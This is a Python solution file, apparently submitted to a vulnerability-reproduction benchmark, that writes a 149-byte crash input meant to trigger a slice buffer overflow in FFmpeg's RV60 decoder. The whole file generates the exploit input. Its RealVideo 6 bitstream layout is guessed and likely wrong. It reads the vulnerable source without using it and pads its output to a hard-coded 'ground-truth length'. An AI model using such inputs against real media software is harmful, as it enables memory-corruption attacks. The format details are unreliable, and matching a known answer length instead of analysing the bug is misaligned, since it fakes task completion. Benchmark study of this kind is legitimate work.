import tarfile
import os
import tempfile
import subprocess
import sys
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the source code tarball
        with tarfile.open(src_path, 'r') as tar:
            tar.extractall(path='/tmp/extracted')
        
        # Look for the vulnerable function in rv60dec.c
        vulnerable_file = None
        for root, dirs, files in os.walk('/tmp/extracted'):
            for file in files:
                if file.endswith('rv60dec.c'):
                    vulnerable_file = os.path.join(root, file)
                    break
            if vulnerable_file:
                break
        
        if not vulnerable_file:
            # If we can't find the exact file, generate a generic PoC
            return self._generate_generic_poc()
        
        # Analyze the vulnerable code to understand the structure
        with open(vulnerable_file, 'r') as f:
            content = f.read()
        
        # Based on typical RV60 structure, create a minimal valid bitstream
        # that triggers the slice buffer overflow
        poc = bytearray()
        
        # RV60 frame header (simplified)
        # Start code
        poc.extend(b'\x00\x00\x01\xB0')  # Picture start code
        
        # Picture header basics
        poc.extend(b'\x01')  # Picture type (I-frame)
        
        # Width and height (minimal values)
        poc.extend(b'\x01\x00')  # Width: 256
        poc.extend(b'\x01\x00')  # Height: 256
        
        # Quantizer
        poc.extend(b'\x01')
        
        # Version
        poc.extend(b'\x02')
        
        # Create a slice that will trigger the overflow
        # Slice start code
        poc.extend(b'\x00\x00\x01\x0B')
        
        # Slice vertical position (0)
        poc.extend(b'\x00')
        
        # Quantizer (same as picture)
        poc.extend(b'\x01')
        
        # The vulnerability is in how slice_gb is initialized.
        # We need to create a slice where the allocated buffer size
        # doesn't match what the code expects.
        
        # Add slice data with a large size value that will cause
        # out-of-bounds access when reading
        slice_data = bytearray()
        
        # Add macroblock data - minimal pattern that triggers the bug
        # First macroblock: coded flag
        slice_data.append(0x80)  # Coded, not intra
        
        # Motion vectors (zeros)
        slice_data.append(0x00)
        slice_data.append(0x00)
        
        # Add more data to reach the target size and trigger overflow
        # Fill with pattern that will cause crash when accessed
        remaining = 149 - len(poc) - len(slice_data)
        slice_data.extend(b'\xFF' * remaining)
        
        poc.extend(slice_data)
        
        # Ensure exact ground-truth length
        poc = poc[:149]
        if len(poc) < 149:
            poc.extend(b'\x00' * (149 - len(poc)))
        
        return bytes(poc)
    
    def _generate_generic_poc(self) -> bytes:
        # Fallback generic PoC if we can't analyze the source
        # This creates a minimal RV60 bitstream with a malformed slice
        
        poc = bytearray()
        
        # Picture header
        poc.extend(b'\x00\x00\x01\xB0')  # Picture start code
        poc.extend(b'\x01')  # I-frame
        poc.extend(b'\x40\x00')  # Width 1024
        poc.extend(b'\x40\x00')  # Height 1024
        poc.extend(b'\x01')  # Quantizer
        poc.extend(b'\x02')  # Version
        
        # Slice that triggers the vulnerability
        poc.extend(b'\x00\x00\x01\x0B')  # Slice start code
        poc.extend(b'\x00')  # Vertical position
        poc.extend(b'\x01')  # Quantizer
        
        # Malformed slice data designed to trigger buffer overflow
        # The vulnerability occurs when slice_gb is not initialized
        # with the correct buffer size
        
        # Create a long run of data that will cause out-of-bounds read
        # when the decoder tries to parse the slice
        remaining = 149 - len(poc)
        
        # Pattern designed to trigger the specific bug:
        # - Non-zero values to avoid early termination
        # - Specific bit patterns that might trigger the overflow
        overflow_pattern = bytes([
            0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA, 0x55, 0xAA,
            0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
        ])
        
        # Repeat the pattern to fill the buffer
        while len(poc) < 149:
            poc.extend(overflow_pattern)
        
        return bytes(poc[:149])